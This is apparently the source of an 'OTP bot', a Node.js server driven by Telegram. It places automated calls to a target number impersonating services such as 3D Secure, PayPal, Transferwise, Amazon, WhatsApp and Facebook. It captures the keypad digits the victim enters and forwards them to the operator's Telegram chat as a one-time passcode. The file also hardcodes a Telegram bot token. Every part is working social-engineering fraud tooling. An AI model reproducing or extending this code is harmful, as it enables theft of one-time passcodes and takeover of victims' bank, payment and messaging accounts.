const express = require("express");
const TelegramBot = require("node-telegram-bot-api");
const app = express();
const server = require("http").createServer(app);

const port = process.env.PORT || 9000;

var cors = require("cors");
var axios = require("axios");

app.use(cors());
app.use(express.urlencoded({ extended: false }));
app.use(express.json());

const token = "5031424484:AAFonqAonvL4ofE5kDUitpWM7Wu0tgMF_Ao";
const bot = new TelegramBot(token);

const init = () => {
  var config = {
    method: "get",
    url: `https://api.telegram.org/bot${token}/setWebhook?url=https://1b42-105-112-216-89.ngrok.io/bot${token}`,
    headers: {},
  };
  axios(config)
    .then(function (response) {
      console.log(JSON.stringify(response.data));
    })
    .catch(function (error) {
      console.log(error);
    });
};

server.listen(port, () => {
  console.log(`server is running on port: ${port}`);

  // init(); //.then(() => console.log("bot weebhook set"));
});

const webhookUrl = `/bot${token}`;

const providers = [
  "3D_Secure",
  "Paypal",
  "Transferwise",
  "Amazon",
  "Amazon",
  "Cdiscount",
  "Whatsapp",
  "Facebook",
];

let savedNunber;
let chatid;

app.post(`/bot${token}`, (req, res) => {
  const nexmo = require("./make-call-ncco");
  const text = req.body.message.text;
  chatid = req.body.message.chat.id;

  // split text
  const match = text.split(/\s+/);
  console.log(match);

  const startCommand = (chartid) =>
    bot.sendMessage(
      chartid,
      "Run this code to start \ncall {number}\nexample: call 19714263618"
    );

  if (text === "/start") {
    startCommand(chatid);
  } else if (match.length == 2) {
    const number = match[1];
    savedNunber = number;
    bot.sendMessage(chatid, "Select service to bypass below 👇", {
      reply_markup: {
        keyboard: [
          [`3D_Secure`, `Paypal`],
          [`Transferwise`, "Amazon"],
          [`Amazon`, `Cdiscount`],
          [`Whatsapp`, `Facebook`],
        ],
      },
    });
  } else if (match.length == 1) {
    const selectedProvider = match[0];
    const isProviser = providers.includes(selectedProvider);
    if (isProviser) {
      // start call
      nexmo.call(savedNunber, selectedProvider);
      console.log(`now calling ${selectedProvider} @ ${savedNunber}`);
    } else {
      startCommand(chatid);
    }
  }

  res.sendStatus(200);
});

app.post(`/webhooks/notification`, (req, res) => {
  const { status } = req.body;

  bot.sendMessage(chatid, status);
  console.log(`notification: \n ${status}`);
  res.sendStatus(200);
});

app.post("/webhooks/dtmf", (request, response) => {
  const dtmf = request.body.dtmf;

  bot.sendMessage(chatid, `the one time passwcode is 👇 \n${dtmf}`);

  const ncco = [
    {
      action: "talk",
      text: `You pressed ${dtmf}`,
    },
  ];

  response.json(ncco);
});
